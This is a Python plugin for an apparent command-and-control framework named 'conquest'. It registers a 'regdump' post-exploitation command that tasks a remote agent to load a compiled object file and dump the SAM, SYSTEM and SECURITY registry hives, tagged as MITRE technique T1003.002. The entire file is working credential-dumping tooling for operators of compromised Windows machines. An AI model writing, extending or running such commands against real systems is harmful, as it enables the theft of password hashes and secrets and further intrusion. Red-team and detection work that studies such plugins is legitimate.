import conquest
import os.path 

cmd_regdump = (
    conquest.createCommand(name="regdump", description="Dump SAM, SYSTEM and SECURITY from the Windows registry.", example="regdump C:\\Windows\\Tasks",
                           message="Tasked agent to dump SAM, SYSTEM and SECURITY.", mitre=["T1003.002"])
            .addArgString("path", "Output path (default: current directory).", False, ".")
            .setHandler(lambda agentId, cmdline, args: (
                path := conquest.get_string(args, 0),

                bof := conquest.modules_root() + "/credential-dumping/regdump/regdump.x64.o",
                params := conquest.bof_pack("z", [
                    path         # z: Output path
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            ))
).registerToGroup("post-exploitation")